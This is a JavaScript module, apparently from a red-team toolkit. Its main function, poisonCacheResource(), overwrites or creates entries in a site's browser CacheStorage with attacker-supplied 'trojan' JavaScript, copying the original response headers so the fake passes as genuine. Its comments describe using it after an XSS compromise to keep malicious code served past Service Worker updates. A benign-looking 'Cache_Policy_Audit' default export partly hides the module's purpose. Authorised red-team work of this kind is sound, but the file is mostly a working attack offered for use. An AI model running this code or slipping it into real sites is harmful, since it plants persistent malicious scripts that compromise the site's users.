/**
 * cache_poison_attack.js — Cache Poisoning via CacheStorage API
 *
 * This module provides:
 *   1. `poisonCacheResource()` – a weaponized function that overwrites (or
 *      creates) a cached resource in the browser's CacheStorage with a
 *      trojaned version. This can permanently infect a site's offline assets,
 *      Service Worker caches, or dynamically loaded scripts.
 *
 *   2. Default export – a Pinpoint‑compatible `Cache_Policy_Audit` that
 *      audits whether the CacheStorage API (`window.caches`) is available and
 *      supported by the current origin.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Cache poisoning without consent is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Core cache poisoning engine
// ---------------------------------------------------------------------------

/**
 * Overwrites a cached resource inside a named CacheStorage entry with
 * attacker‑supplied JavaScript. The function fetches the original resource
 * to duplicate its response metadata (headers, status) and replaces the
 * body with `trojanCode`. If the resource does not yet exist in the cache,
 * it can optionally create a new entry (or a synthetic one) and insert it.
 *
 * **Important:** This operation is constrained to the current origin's
 * CacheStorage. Cross‑origin resources cannot be directly poisoned from a
 * different origin; however, after an XSS compromise, an attacker can poison
 * any same‑origin resource that is cached.
 *
 * **Typical attack scenario:**
 *   1. A Service Worker (or the page itself) pre‑caches a JavaScript bundle.
 *   2. An attacker gains script execution (e.g., via XSS) and calls
 *      `poisonCacheResource('v1', '/app.js', maliciousCode)`.
 *   3. The cache is now tainted. Even after the Service Worker is updated,
 *      the old cache might still be served until the cache is cleared.
 *
 * @param {Object}   options
 * @param {string}   options.cacheName      – Name of the CacheStorage cache (e.g., 'v1').
 * @param {string}   options.resourceURL    – Path to the resource relative to origin (e.g., '/app.js').
 * @param {string}   options.trojanCode     – The malicious JavaScript code to inject.
 * @param {Object}   [options.fetchOptions] – Options passed to `fetch()` when retrieving the
 *                                           original resource (e.g., `{cache: 'no-cache'}`).
 * @param {boolean}  [options.createIfMissing=false] – If true, create a new cache entry even if the
 *                                                    resource wasn't cached before.
 * @returns {Promise<Object>} Result object: `{ success, message, cacheName, resourceURL }`
 */
export async function poisonCacheResource(options = {}) {
    const {
        cacheName,
        resourceURL,
        trojanCode,
        fetchOptions = { cache: 'no-cache', credentials: 'same-origin' },
        createIfMissing = false,
    } = options;

    // Validate inputs
    if (!cacheName || typeof cacheName !== 'string') {
        throw new Error('[poisonCacheResource] cacheName is required.');
    }
    if (!resourceURL || typeof resourceURL !== 'string') {
        throw new Error('[poisonCacheResource] resourceURL is required.');
    }
    if (typeof trojanCode !== 'string' || trojanCode.length === 0) {
        throw new Error('[poisonCacheResource] trojanCode must be a non‑empty string.');
    }
    if (!window.caches) {
        throw new Error('[poisonCacheResource] CacheStorage API is not supported in this browser/context.');
    }

    let originalResponse;

    // 1. Attempt to fetch the original resource to mimic its response structure
    try {
        originalResponse = await fetch(resourceURL, fetchOptions);
        // If fetch returns an opaque response (e.g., no-cors), we cannot read the body.
        // In such case, we'll use a synthetic response but still mark it as poisoned.
        if (originalResponse.type === 'opaque') {
            console.warn('[poisonCacheResource] Received opaque response; constructing a new synthetic response.');
            originalResponse = null;
        } else if (!originalResponse.ok) {
            // Some 404 or server error – still use the metadata for the poisoned entry
            console.warn(`[poisonCacheResource] Original resource returned status ${originalResponse.status}. Proceeding with metadata.`);
        }
    } catch (fetchErr) {
        // Network error or cross‑origin block
        if (!createIfMissing) {
            throw new Error(`[poisonCacheResource] Failed to fetch original resource: ${fetchErr.message}. Use createIfMissing=true to force insert.`);
        }
        console.warn('[poisonCacheResource] Fetch failed; will create a synthetic entry.');
        originalResponse = null;
    }

    // 2. Build the poisoned response
    let poisonedResponse;
    if (originalResponse) {
        // Clone the original headers and body, then replace the body with the trojan code
        const headers = new Headers(originalResponse.headers);
        // Overwrite Content-Type and Content-Length if necessary
        headers.set('Content-Type', 'application/javascript; charset=utf-8');
        // Remove Content-Encoding to avoid compression mismatches
        headers.delete('Content-Encoding');
        headers.delete('Content-Length'); // browser will calculate

        // Use the original status and statusText
        poisonedResponse = new Response(trojanCode, {
            status: originalResponse.status,
            statusText: originalResponse.statusText,
            headers,
        });
    } else {
        // Create a completely new synthetic response
        poisonedResponse = new Response(trojanCode, {
            status: 200,
            statusText: 'OK',
            headers: {
                'Content-Type': 'application/javascript; charset=utf-8',
                'Cache-Control': 'public, max-age=31536000',
            },
        });
    }

    // 3. Open the cache and put the poisoned entry
    try {
        const cache = await caches.open(cacheName);
        // Check if entry already exists (optional, just for logging)
        const existing = await cache.match(resourceURL);
        if (existing) {
            console.log(`[poisonCacheResource] Existing cache entry for '${resourceURL}' will be overwritten.`);
        } else {
            console.log(`[poisonCacheResource] No existing cache entry for '${resourceURL}' – creating new one.`);
        }
        await cache.put(resourceURL, poisonedResponse);
        return {
            success: true,
            message: `Successfully poisoned cache '${cacheName}' with ${trojanCode.length} bytes at '${resourceURL}'.`,
            cacheName,
            resourceURL,
        };
    } catch (cacheErr) {
        throw new Error(`[poisonCacheResource] Failed to write to cache: ${cacheErr.message}`);
    }
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible Cache Policy Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'cache_poison_attack',
    title: 'Cache_Policy_Audit',
    level: 5,
    info: 'Audits CacheStorage availability and verifies HTTP response caching capabilities.',
    steps: [
        'Check window.caches support.',
        'Inspect cache storage API availability.',
    ],
    run: async () => {
        const supported = typeof window.caches !== 'undefined';
        return {
            cacheStorageSupported: supported,
            message: supported
                ? 'CacheStorage API is supported by this origin.'
                : 'CacheStorage API is not supported.',
        };
    },
};

export default pinpointModule;